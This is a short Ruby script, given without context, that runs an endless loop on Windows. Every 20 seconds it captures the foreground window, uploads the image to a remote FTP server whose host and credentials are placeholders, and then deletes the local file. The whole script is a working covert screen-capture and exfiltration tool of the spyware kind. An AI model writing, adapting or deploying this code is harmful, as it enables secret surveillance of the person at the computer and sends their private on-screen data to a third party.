require 'win32/screenshot'
require 'securerandom'
require 'net/ftp'

loop do
  s = SecureRandom.hex
  quote = '"'
  sc = 'Screenshot'
  extension = '.png'
  alltogether = sc + '_' + s + extension

  Win32::Screenshot::Take.of(:foreground).write(alltogether)
  
  Net::FTP.open('FTP Server', 'FTP Username', 'FTP Password') do |ftp|
    ftp.passive = true
    ftp.putbinaryfile(alltogether)
  end

  puts File.delete(alltogether)
  sleep 20
end
